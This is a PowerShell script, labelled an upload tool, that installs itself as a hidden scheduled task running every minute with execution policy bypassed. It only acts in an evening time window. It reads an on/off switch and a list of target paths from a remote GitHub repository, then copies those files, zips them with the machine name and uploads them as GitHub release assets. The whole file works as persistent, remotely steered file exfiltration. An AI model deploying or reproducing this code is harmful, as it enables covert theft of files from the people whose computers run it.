# === console.ps1 Self-Registering Upload Script ===
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# ==== Configuration ====
$repo = "ertgyhujkfghj/2"
$token = $env:GH_TOKEN
$taskName = "console"
$logFile = "$env:TEMP\upload-log.txt"

function Log($msg) {
    $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') | $msg"
    $line | Out-File -Append -FilePath $logFile -Encoding UTF8
    Write-Host $line
}

if (-not $token) {
    Log "❌ GH_TOKEN is not set, exiting script"
    exit 1
}

# ==== Time Window ====
$now = Get-Date
$startTime = [datetime]::Today.AddHours(19).AddMinutes(30)
$endTime = [datetime]::Today.AddDays(1)
if ($now -lt $startTime -or $now -ge $endTime) {
    Log "🕒 Not in allowed time range (19:30 ~ 00:00), exiting"
    exit 0
}

# ==== Register Scheduled Task ====
$taskExists = schtasks /Query /TN $taskName 2>$null
if ($LASTEXITCODE -ne 0) {
    Log "🛠️ Task $taskName not found, registering every 1 minute..."
    $taskRun = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    schtasks /Create /TN $taskName /TR $taskRun /SC MINUTE /RI 1 /F
    if ($LASTEXITCODE -eq 0) {
        Log "✅ Task registered successfully (every 1 minute)"
    } else {
        Log "❌ Failed to register task"
        exit 1
    }
} else {
    Log "ℹ️ Task $taskName already exists"
}

# ==== Remote Upload Control ====
$enabledUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-enabled.txt"
$pathListUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-path.txt"

try {
    $enabled = Invoke-RestMethod -Uri $enabledUrl -UseBasicParsing
    if ($enabled.Trim().ToLower() -ne "on") {
        Log "🛑 Upload switch is OFF"
        exit 0
    }
} catch {
    Log "❌ Failed to read upload switch: $($_.Exception.Message)"
    exit 1
}

# ==== Get Upload Paths ====
try {
    $pathsRaw = Invoke-RestMethod -Uri $pathListUrl -UseBasicParsing
    $uploadPaths = $pathsRaw -split "`n" | Where-Object { $_.Trim() -ne "" }
    Log "📦 Upload paths:"
    $uploadPaths | ForEach-Object { Log " - $_" }
} catch {
    Log "❌ Failed to fetch upload paths: $($_.Exception.Message)"
    exit 1
}

# ==== Copy Files ====
$tempDir = "$env:TEMP\upload_temp_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

foreach ($path in $uploadPaths) {
    if (-not (Test-Path $path)) {
        Log "⚠️ Path not found: $path"
        continue
    }
    try {
        $item = Get-Item $path -Force
        $dest = Join-Path $tempDir $item.Name
        Copy-Item -Path $item.FullName -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
        Log "✅ Copied: $($item.FullName)"
    } catch {
        Log "⚠️ Copy failed: $($item.FullName)"
    }
}

# ==== 包含日志文件本身 ====
Copy-Item $logFile -Destination "$tempDir\upload-log.txt" -Force -ErrorAction SilentlyContinue

# ==== Create ZIP ====
Add-Type -AssemblyName System.IO.Compression.FileSystem
$computerName = $env:COMPUTERNAME
$tag = "upload-$computerName-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$zipPath = "$env:TEMP\$tag.zip"
try {
    [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)
    Log "📦 Created ZIP: $zipPath"
} catch {
    Log "❌ Compression failed: $($_.Exception.Message)"
    Remove-Item $tempDir -Recurse -Force
    exit 1
}
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue

# ==== Check if ZIP already exists on GitHub ====
$releaseListUrl = "https://api.github.com/repos/$repo/releases"
try {
    $headers = @{ Authorization = "token $token"; "User-Agent" = "upload-script" }
    $releases = Invoke-RestMethod -Uri $releaseListUrl -Headers $headers -Method GET
    if ($releases | Where-Object { $_.tag_name -eq $tag }) {
        Log "⏭️ ZIP already uploaded for tag $tag, skipping"
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        exit 0
    }
} catch {
    Log "⚠️ Failed to check existing releases: $($_.Exception.Message)"
}

# ==== Upload ZIP ====
try {
    $release = Invoke-RestMethod -Uri $releaseListUrl -Headers $headers -Method POST -Body (@{
        tag_name   = $tag
        name       = $tag
        draft      = $false
        prerelease = $false
    } | ConvertTo-Json -Depth 3)

    $uploadUrl = "https://uploads.github.com/repos/$repo/releases/$($release.id)/assets?name=$(Split-Path $zipPath -Leaf)"
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent" = "upload-script"
    } -InFile $zipPath

    Log "✅ Upload successful: $tag.zip"
} catch {
    Log "❌ Upload failed: $($_.Exception.Message)"
}

Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
